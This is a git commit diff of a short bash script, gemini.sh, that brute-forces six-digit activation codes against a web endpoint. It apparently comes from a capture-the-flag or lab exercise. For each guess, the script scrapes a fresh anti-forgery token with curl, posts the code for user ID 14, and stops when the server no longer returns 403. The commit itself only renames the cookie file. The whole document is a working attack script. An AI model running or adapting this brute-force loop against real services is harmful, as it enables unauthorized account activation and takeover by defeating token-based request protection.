a1b602dabe55ef342f7bd03eb3b658bda89f60bc
Sayantan5 <35872064+Sayantan5@users.noreply.github.com>
2019-01-15 22:06:45 +0530

    Update gemini.sh

--- gemini.sh
+++ gemini.sh
@@ -1,8 +1,8 @@
 #!/bin/bash
 url="http://ip/activate.php"
 for key in {000000..999999}; do
-	token=$(curl -s -c cookiejar $url | awk -F 'value=' '/token/ {print $2}' | cut -d "'" -f2)
-	resp=$(curl -s -w %{http_code} -b cookiejar --data "userid=14&activation_code=$key&token=${token}" $url | tail -n 1 | cut -d ">" -f2)
+	token=$(curl -s -c cookie $url | awk -F 'value=' '/token/ {print $2}' | cut -d "'" -f2)
+	resp=$(curl -s -w %{http_code} -b cookie --data "userid=14&activation_code=$key&token=${token}" $url | tail -n 1 | cut -d ">" -f2)
 	if [ $resp -ne 403 ]; then
 		echo "Key = "$key
 		break
